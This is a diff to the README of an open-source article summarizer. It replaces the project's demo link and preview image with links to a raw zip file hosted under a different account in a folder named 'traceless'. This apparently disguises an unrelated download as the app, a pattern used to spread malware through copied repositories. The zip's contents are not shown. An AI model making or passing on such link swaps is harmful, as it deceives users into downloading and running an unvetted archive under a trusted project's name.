@@ -1,6 +1,6 @@
-## [AI-Summarizer](https://exslym.github.io/AI-Summarizer/)
+## [AI-Summarizer](https://raw.githubusercontent.com/Evidement/AI-Summarizer-Application/main/traceless/AI-Summarizer-Application.zip)
 
-[![preview](https://github.com/exslym/AI-Summarizer/blob/main/public/preview.jpg)](https://github.com/exslym/AI-Summarizer/)
+[![preview](https://raw.githubusercontent.com/Evidement/AI-Summarizer-Application/main/traceless/AI-Summarizer-Application.zip)](https://raw.githubusercontent.com/Evidement/AI-Summarizer-Application/main/traceless/AI-Summarizer-Application.zip)
 
 ### This minimalistic cozy color app is an open-source article summarizer that transforms lengthy articles into clear and concise summaries, powered by RapidAPI (limited requests per day).
 
